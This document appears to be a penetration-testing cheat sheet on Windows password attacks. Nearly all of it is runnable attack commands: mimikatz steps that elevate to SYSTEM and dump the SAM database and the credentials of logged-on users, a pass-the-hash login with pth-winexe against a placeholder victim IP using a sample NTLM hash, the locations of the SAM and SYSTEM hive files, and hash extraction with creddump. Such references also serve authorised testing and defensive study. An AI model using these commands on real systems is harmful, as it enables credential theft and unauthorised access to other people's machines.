# Passwords

---

- [mimikatz](#mimikatz)
- [Pass The Hash](#pass-the-hash)
- [SAM](#sam)

<a name="mimikatz"></a>
## mimikatz

Elevate to SYSTEM from a administrator (High Integrity).
```sh
token::elevate
```

Engage the SeDebugPrivledge.
```sh
privilege::debug
```

Dump the sam database.
```sh
lsadump::sam
```

Dump logged on users credentials.
```sh
sekurlsa::logonpasswords
```

Other windows dumping tools: pwdump, fgdump, Windows Credential Editor (wce).

<a name="pass-the-hash"></a>
## Pass The Hash
### pth-winexe
Performs authentication using SMB protocol.

Format
```sh
pth-winexe -U username%lm-hash:ntlm-hash //ip cmd
```

Login using username john a found hash.
```sh
pth-winexe -U john%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //__VICTIM_IP__ cmd
```

<a name="sam"></a>
## SAM

Example Paths:
```sh
C:\Windows\system32\config\RegBack\sam
C:\Windows\system32\config\RegBack\security
C:\Windows\system32\config\RegBack\system
```

Backups may exist, eg: sam.old or sam.bak.

[Cred Dump](https://github.com/moyix/creddump.git) can export the hashes if you have both SAM and SYSTEM.
```sh
python creddump/pwdump.py system sam
```
